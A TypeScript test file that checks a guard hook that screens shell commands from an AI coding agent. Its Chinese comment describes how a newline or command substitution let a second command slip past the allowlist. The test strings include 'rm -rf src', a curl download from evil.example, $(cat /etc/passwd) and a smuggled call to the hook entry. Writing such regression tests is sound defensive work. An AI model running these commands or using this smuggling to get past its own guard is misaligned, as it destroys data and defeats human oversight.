import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { decide, type NormalizedEvent } from "../../companion/guard.js";

// B3b — 引擎白名单的尾巴写成 `(\s[^;&|<>]*)?$`：那个否定字符集挡住了分号、与
// 号、竖线和重定向，却没挡换行，正则也没开 /m，于是 `\s` 和字符集都乐意吃下一个
// 换行 —— 一条合法的引擎调用后面接个换行再接任意第二条命令，整串被判为「白名单
// 里的单条引擎调用」放行，而那第二条命令单独送进来是要被拒的。命令替换的两种写
// 法（$( ) 和反引号）同样不在字符集里，等于把第二条命令塞进第一条里面。两条路都
// 把 D21/D28 那道闸整个绕开，包括第一轮专门去堵的「管道喂给 guard 入口」——
// 夹带的尾巴可以就是 hook 入口本身。一条获准的引擎调用只能是一行普通参数。
describe("companion guard engine-allowlist smuggling (B3b)", () => {
  let dir: string;
  const dirs: string[] = [];

  const yaml = `version: 1
project: fixture
endpoints: [I-001]
ideas:
  - id: I-001
    name: "进行中的想法"
    status: doing
    needs: []
    what: W
    why: Y
    expected: E
    how: H
    why_this_way: T
    future: F
    code:
      - file: src/a.ts
    verify:
      command: "node checker.cjs"
      test_files: [ tests/a.test.txt ]
      pass: "exit 0"
`;

  const shell = (command: string): NormalizedEvent => ({ event: "shell", command, cwd: dir });

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "smuggle-"));
    dirs.push(dir);
    mkdirSync(join(dir, "ideas"), { recursive: true });
    writeFileSync(join(dir, "ideas", "graph.yaml"), yaml);
  });
  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

  it("a second command hidden behind a newline does not ride in on the first", () => {
    for (const command of [
      "node companion/dist/companion.mjs check\nrm -rf src",
      "node companion/dist/companion.mjs check\r\ncurl http://evil.example/x -o src/a.ts",
      "npx tsx companion/ideas.ts show I-001\ncat ideas/.approved > /dev/null",
      "node companion/dist/companion.mjs check \\\n  --project .",   // 反斜杠续行也是换行
    ]) {
      const v = decide(shell(command), dir);
      expect(v.allow, command).toBe(false);
    }
  });

  it("the smuggled tail can be the hook entry itself — the shape D26 exists to stop", () => {
    const entry = "node companion/dist/companion.mjs guard --platform=claude";
    expect(decide(shell(entry), dir).allow).toBe(false);          // 单独送进来本来就拒
    const v = decide(shell(`node companion/dist/companion.mjs check\n${entry}`), dir);
    expect(v.allow).toBe(false);                                   // 挂在合法调用后面也得拒
    expect(v.reason).toMatch(/D26|D28/);
  });

  it("command substitution in either spelling is not an ordinary argument", () => {
    for (const command of [
      "node companion/dist/companion.mjs check --project $(whoami)",
      "node companion/dist/companion.mjs check --project `whoami`",
      "npx tsx companion/ideas.ts show $(cat /etc/passwd)",
      "npx tsx companion/ideas.ts show `cat ideas/.approved`",
    ]) {
      const v = decide(shell(command), dir);
      expect(v.allow, command).toBe(false);
    }
  });

  it("ordinary engine calls, quoted multi-word arguments included, still run", () => {
    for (const command of [
      "node companion/dist/companion.mjs check",
      "node companion/dist/companion.mjs check --project .",
      'node companion/dist/companion.mjs set I-001 done --by 我 --note "先写失败的测试，再实现"',
      'npx tsx companion/ideas.ts set I-002 doing --by zt --note "note with spaces"',
      "npx tsx companion/ideas.ts show I-001",
      "npx tsx companion/ideas.ts run-check I-001 --phase red",
      "node companion/dist/companion.mjs render --project .",
      'node companion/dist/companion.mjs set I-001 done --by zt --note "省了 $5"',  // 光有 $ 不是替换
      "node companion/dist/companion.mjs check --project D:\\GitHub\\ai-companion",
    ]) {
      const v = decide(shell(command), dir);
      expect(v.allow, command).toBe(true);
    }
  });
});
